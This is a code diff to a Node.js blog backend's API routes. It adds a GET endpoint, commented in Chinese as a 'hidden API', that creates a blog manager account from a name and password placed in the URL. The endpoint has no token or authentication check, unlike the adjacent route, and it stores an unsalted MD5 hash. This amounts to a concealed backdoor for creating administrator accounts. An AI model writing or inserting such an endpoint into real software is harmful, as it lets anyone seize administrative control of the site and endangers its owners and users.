@@ -84,6 +84,24 @@ module.exports = {
         res.data = {}
         ctx.rest(res)
     },
+    //这是一个隐藏API
+    'GET /api/manage/register/:manageName/:managePassword': async (ctx, next) => {
+        let paraCheckResult = Check.checkString(ctx.params,'manageName')
+        if(paraCheckResult){
+            ctx.rest(paraCheckResult)
+            return
+        }
+        paraCheckResult = Check.checkString(ctx.params,'managePassword')
+        if(paraCheckResult){
+            ctx.rest(paraCheckResult)
+            return
+        }
+        let mName = ctx.params.manageName
+        let mPass = Tool.md5(ctx.params.managePassword)
+        let sql = 'insert into blog_manager values(0,?,?,?,?,?,?,?,0)'
+        let res = await DB.exec(sql,[mName,mPass,'',0,0,0,''])
+        ctx.rest(res)
+    },
 
     'POST /api/manage/head/:mId/:token': async (ctx, next) => {
        let tokenResult = await Check.checkManageToken(ctx)
@@ -108,6 +126,8 @@ module.exports = {
        res.data = {url:urlPath}
        ctx.rest(res)
     },
+
+
 }
 
 
